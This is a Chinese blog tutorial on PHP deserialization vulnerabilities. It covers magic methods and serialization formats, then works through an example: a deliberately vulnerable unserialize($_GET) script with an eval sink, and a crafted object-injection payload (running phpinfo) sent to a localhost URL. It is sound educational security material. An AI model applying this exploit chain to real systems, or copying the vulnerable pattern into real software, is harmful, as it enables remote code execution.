<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.126.1"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="反序列化"><meta itemprop=description content="集中一点,登峰造极"><meta name=description content="集中一点,登峰造极"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://zp9080.github.io/imgs/author.png"><meta itemprop=keywords content="PHP"><meta property="og:type" content="article"><meta property="og:title" content="反序列化"><meta property="og:description" content="集中一点,登峰造极"><meta property="og:image" content="/imgs/author.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://zp9080.github.io/post/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><meta property="og:site_name" content="f1ow-blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="f1ow"><meta property="article:published_time" content="2024-10-23 15:55:50 +0800 CST"><meta property="article:modified_time" content="2024-10-23 15:55:50 +0800 CST"><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/font-awesome/6.6.0/css/all.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/animate.css/4.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href=/css/main.min.bfbac3431de920c11b5b1cafa45029ea1bc93d5d3da50fed4ab6924b4c250360.css><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":false,"isHome":false,"isPage":true,"path":"%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96","permalink":"https://zp9080.github.io/post/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"反序列化","waline":{"js":[{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"2.15.8"},{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>反序列化 - f1ow-blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><div class=overlay></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>f1ow-blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>集中一点,登峰造极</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>207</span></a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-categories hvr-icon"></i>分类</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><ul><li><a href=#定义>定义</a></li><li><a href=#魔法方法>魔法方法</a></li><li><a href=#反序列化成因>反序列化成因</a></li><li><a href=#反序列化的应用>反序列化的应用</a></li><li><a href=#例题>例题</a></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=f1ow src=/imgs/img-lazy-loading.gif data-src=/imgs/author.png><p class=site-author-name itemprop=name>f1ow</p><div class=site-description itemprop=description>集中一点,登峰造极</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>207</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>38</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>80</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/zp9080 title="Github → https://github.com/zp9080" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://v3rdant.cn/ title=https://v3rdant.cn/ target=_blank>v3rdant</a></li><li class=links-of-blogroll-item><a href=https://juicymio.github.io/ title=https://juicymio.github.io/ target=_blank>juicymio</a></li><li class=links-of-blogroll-item><a href=https://ka7arotto.github.io/ title=https://ka7arotto.github.io/ target=_blank>Goku</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2024-07-28T00:00:00+00:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=273686></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=660></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2025-02-27T17:57:37+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/zp9080 rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://zp9080.github.io/post/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/author.png"><meta itemprop=name content="f1ow"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="f1ow"><meta itemprop=description content="集中一点,登峰造极"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="反序列化"><meta itemprop=description content></span><header class=post-header><h1 class=post-title itemprop="name headline">反序列化
<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/post/PHP/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2024-10-23 15:55:50 +0800 CST" itemprop="dateCreated datePublished" datetime="2024-10-23 15:55:50 +0800 CST">2024-10-23
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/php itemprop=url rel=index><span itemprop=name>WEB/PHP</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>2761</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>6分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=busuanzi_value_page_pv data-path=/post/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><p><a href=https://www.cnblogs.com/fish-pompom/p/11126473.html title=超详细的参考博客 rel="noopener external nofollow noreferrer" target=_blank class=exturl>超详细的参考博客
<i class="fa fa-external-link-alt"></i></a></p><h2 id=定义>定义
<a class=header-anchor href=#%e5%ae%9a%e4%b9%89></a></h2><p><img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/63.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/64.png alt></p><h2 id=魔法方法>魔法方法
<a class=header-anchor href=#%e9%ad%94%e6%b3%95%e6%96%b9%e6%b3%95></a></h2><p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>__construct()，类的构造函数
</span></span><span style=display:flex><span>__destruct()，类的析构函数
</span></span><span style=display:flex><span>__call()，在对象中调用一个不可访问方法时调用
</span></span><span style=display:flex><span>__callStatic()，用静态方式中调用一个不可访问方法时调用
</span></span><span style=display:flex><span>__get()，获得一个类的成员变量时调用
</span></span><span style=display:flex><span>__set()，设置一个类的成员变量时调用
</span></span><span style=display:flex><span>__isset()，当对不可访问属性调用isset()或empty()时调用
</span></span><span style=display:flex><span>__unset()，当对不可访问属性调用unset()时被调用。
</span></span><span style=display:flex><span>__sleep()，执行serialize()时，先会调用这个函数
</span></span><span style=display:flex><span>__wakeup()，执行unserialize()时，先会调用这个函数
</span></span><span style=display:flex><span>__toString()，类被当成字符串时的回应方法
</span></span><span style=display:flex><span>__invoke()，调用函数的方式调用一个对象时的回应方法
</span></span><span style=display:flex><span>__set_state()，调用var_export()导出类时，此静态方法会被调用。
</span></span><span style=display:flex><span>__clone()，当对象复制完成时调用
</span></span><span style=display:flex><span>__autoload()，尝试加载未定义的类
</span></span><span style=display:flex><span>__debugInfo()，打印所需调试信息
</span></span><span style=display:flex><span>(1) __construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。
</span></span><span style=display:flex><span>(2) __wakeup() ：unserialize()时会自动调用
</span></span><span style=display:flex><span>(3) __destruct()：当对象被销毁时会自动调用。
</span></span><span style=display:flex><span>(4) __toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用
</span></span><span style=display:flex><span>(5) __get() :当从不可访问的属性读取数据
</span></span><span style=display:flex><span>(6) __call(): 在对象上下文中调用不可访问的方法时触发
</span></span></code></pre></div><p>其中特别说明一下第四点：这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>(1)echo ($obj) / print($obj) 打印时会触发
</span></span><span style=display:flex><span>(2)反序列化对象与字符串连接时
</span></span><span style=display:flex><span>(3)反序列化对象参与格式化字符串时
</span></span><span style=display:flex><span>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）
</span></span><span style=display:flex><span>(5)反序列化对象参与格式化SQL语句，绑定参数时
</span></span><span style=display:flex><span>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时
</span></span><span style=display:flex><span>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用
</span></span><span style=display:flex><span>(8)反序列化的对象作为 class_exists() 的参数的时候
</span></span></code></pre></div><h2 id=反序列化成因>反序列化成因
<a class=header-anchor href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%88%90%e5%9b%a0></a></h2><p><img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/65.png alt></p><p>在我们的攻击中，反序列化函数 unserialize() 是我们攻击的入口，也就是说，只要这个参数可控，<strong>我们就能传入任何的已经序列化的对象</strong>（只要这个类在当前作用域存在我们就可以利用），<strong>而不是局限于出现 unserialize() 函数的类的对象(也就是说，即使在类的定义中没有这个变量，我们仍然可以通过反序列化传入指定名称的变量)</strong>，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。</p><p>但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是属性，<strong>如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策</strong>，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为<strong>我们有魔法方法。</strong></p><p>魔法正如上面介绍的，魔法方法的调用是在<strong>该类序列化或者反序列化的同时自动完成的</strong>，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p><p><strong>反序列化漏洞的成因在于魔术方法中可能会存在系统调用或者任意代码执行的点</strong>，那么如果攻击者精心构造的序列化数据可以触发这些魔术方法，那么便会达成意料之外的危害</p><h2 id=反序列化的应用>反序列化的应用
<a class=header-anchor href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e5%ba%94%e7%94%a8></a></h2><p>PHP反序列化标识符含义:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>a - array
</span></span><span style=display:flex><span>b - boolean
</span></span><span style=display:flex><span>d - double
</span></span><span style=display:flex><span>i - integer
</span></span><span style=display:flex><span>o - common object
</span></span><span style=display:flex><span>r - reference
</span></span><span style=display:flex><span>s - string
</span></span><span style=display:flex><span>C - custom object
</span></span><span style=display:flex><span>O - class
</span></span><span style=display:flex><span>N - null
</span></span><span style=display:flex><span>R - pointer reference
</span></span><span style=display:flex><span>U - unicode string
</span></span></code></pre></div><p>序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等 函数 : serialize()</p><p>反序列化:恢复原先被序列化的变量 函数: unserialize()</p><p>private属性序列化的时候格式是 %00类名%00成员名</p><p>protected属性序列化的时候格式是 %00*%00成员名</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#666>&lt;?</span>php
</span></span><span style=display:flex><span><span style=color:#b8860b>$test1</span> <span style=color:#666>=</span> <span style=color:#b44>&#34;hello world&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#b8860b>$test2</span> <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>array</span>(<span style=color:#b44>&#34;hello&#34;</span>,<span style=color:#b44>&#34;world&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#b8860b>$test3</span> <span style=color:#666>=</span> <span style=color:#666>123456</span>;
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>echo</span> serialize(<span style=color:#b8860b>$test1</span>); <span style=color:#080;font-style:italic>//  s:11:&#34;hello world&#34;;  序列化字符串
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span><span style=color:#a2f;font-weight:700>echo</span> serialize(<span style=color:#b8860b>$test2</span>); <span style=color:#080;font-style:italic>// a:2:{i:0;s:5:&#34;hello&#34;;i:1;s:5:&#34;world&#34;;} 序列化数组
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span><span style=color:#a2f;font-weight:700>echo</span> serialize(<span style=color:#b8860b>$test3</span>); <span style=color:#080;font-style:italic>//  i:123456;  
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span><span style=color:#080>?&gt;</span><span>
</span></span></span><span style=display:flex><span><span>
</span></span></span><span style=display:flex><span><span>&lt;?php
</span></span></span><span style=display:flex><span><span>class hello{
</span></span></span><span style=display:flex><span><span>    public $test4 = &#34;hello,world&#34;;
</span></span></span><span style=display:flex><span><span>}
</span></span></span><span style=display:flex><span><span>$test = new hello();
</span></span></span><span style=display:flex><span><span>echo serialize($test);  //  O:5:&#34;hello&#34;:1:{s:5:&#34;test4&#34;;s:11:&#34;hello,world&#34;;}  序列化对象  首字母代表参数类型 O-&gt;Objext S-&gt;String...
</span></span></span><span style=display:flex><span><span>?&gt;
</span></span></span></code></pre></div><h2 id=例题>例题
<a class=header-anchor href=#%e4%be%8b%e9%a2%98></a></h2><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#666>&lt;?</span>php
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>class</span> <span style=color:#00f>K0rz3n</span> {
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>private</span> <span style=color:#b8860b>$test</span>;
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>public</span> <span style=color:#b8860b>$K0rz3n</span> <span style=color:#666>=</span> <span style=color:#b44>&#34;i am K0rz3n&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>function</span> __construct() {
</span></span><span style=display:flex><span>        <span style=color:#b8860b>$this</span><span style=color:#666>-&gt;</span><span style=color:#b44>test</span> <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>new</span> L();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>function</span> __destruct() {
</span></span><span style=display:flex><span>        <span style=color:#b8860b>$this</span><span style=color:#666>-&gt;</span><span style=color:#b44>test</span><span style=color:#666>-&gt;</span><span style=color:#b44>action</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>class</span> <span style=color:#00f>L</span> {
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>function</span> <span style=color:#00a000>action</span>() {
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>echo</span> <span style=color:#b44>&#34;Welcome to XDSEC&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>class</span> <span style=color:#00f>Evil</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> <span style=color:#b8860b>$test2</span>;
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>function</span> <span style=color:#00a000>action</span>() {
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>eval</span>(<span style=color:#b8860b>$this</span><span style=color:#666>-&gt;</span><span style=color:#b44>test2</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>unserialize(<span style=color:#b8860b>$_GET</span>[<span style=color:#b44>&#39;test&#39;</span>]);
</span></span></code></pre></div><p>首先我们能看到 unserialize() 函数的参数我们是可以控制的，也就是说我们能<strong>通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)</strong>，
那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，<strong>但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现他有一个魔法函数 __destruct()</strong>，
这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，好，既然这样我们就决定反序列化这个类的对象了，接下来让我们看一下怎么利用(我上面说过了，我们需要控制这个类的某些属性，通过控制属性实现我们的攻击).</p><p>destruct() 里面只用到了一个属性 test ，那肯定就是他了，那我们控制这个属性为什么内容我们就能攻击了呢，我们再观察一下 那些地方调用了 action() 函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的。
<strong>果然我们在 Evil 这个类中发现他的 action() 函数调用了 eval(),那我们的想法就很明确了，我们需要将 K0rz3n 这个类中的 test 属性篡改为 Evil 这个类的对象，然后为了 eval 能执行命令，我们还要篡改 Evil 对象的 test2 属性</strong>，将其改成我们的 Payload.</p><p>分析完毕以后我们就可以构建我们的序列化字符串了，构建的方法不是手写(当然你愿意我也不拦着你，理论上是可行的)，我们要将这段代码复制一下，然后修改一些内容并进行序列化操作.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#666>&lt;?</span>php
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>class</span> <span style=color:#00f>K0rz3n</span> {
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>private</span> <span style=color:#b8860b>$test</span>;
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>function</span> __construct() {
</span></span><span style=display:flex><span>        <span style=color:#b8860b>$this</span><span style=color:#666>-&gt;</span><span style=color:#b44>test</span> <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>new</span> Evil;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>class</span> <span style=color:#00f>Evil</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>var</span> <span style=color:#b8860b>$test2</span> <span style=color:#666>=</span> <span style=color:#b44>&#34;phpinfo();&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b8860b>$K0rz3n</span> <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>new</span> K0rz3n;
</span></span><span style=display:flex><span><span style=color:#b8860b>$data</span> <span style=color:#666>=</span> serialize(<span style=color:#b8860b>$K0rz3n</span>);
</span></span><span style=display:flex><span>file_put_contents(<span style=color:#b44>&#34;seria.txt&#34;</span>, <span style=color:#b8860b>$data</span>);
</span></span></code></pre></div><p>我们去除了一切与我们要篡改的属性无关的内容，对其进行序列化操作，然后将序列化的结果复制出来，想刚刚的代码发起请求</p><p>http://127.0.0.1/php_unserialize/K0rz3n.php?test=O:6:&ldquo;K0rz3n&rdquo;:1:{s:12:&ldquo;K0rz3ntest&rdquo;;O:4:&ldquo;Evil&rdquo;:1:{s:5:&ldquo;test2&rdquo;;s:10:&ldquo;phpinfo();&rdquo;;}}</p><p><strong>注意要添加上:%00xxx%00</strong></p><p>可以看到我们攻击成功，特别要提醒一下的就是我在图中框起来的部分，上面说过由于是私有属性，他有自己特殊的格式会在前后加两个 %00 ，所以我们在传输过程中绝对不能忘掉.</p><p>通过这个简单的例子总结一下寻找 PHP 反序列化漏洞的方法或者说流程</p><p>(1) 寻找 unserialize() 函数的参数是否有我们的可控点</p><p>(2) 寻找我们的反序列化的目标，重点寻找 存在 wakeup() 或 destruct() 魔法函数的类</p><p>(3) 一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的</p><p>(4) 找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击</p></div><footer class=post-footer><div class=post-tags><a href=/tags/php>PHP</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.png alt="f1ow - 支付宝">
<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.png alt="f1ow - 微信">
<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
反序列化</li><li class=post-copyright-author><strong>本文作者： </strong>f1ow</li><li class=post-copyright-link><strong>本文链接：</strong>
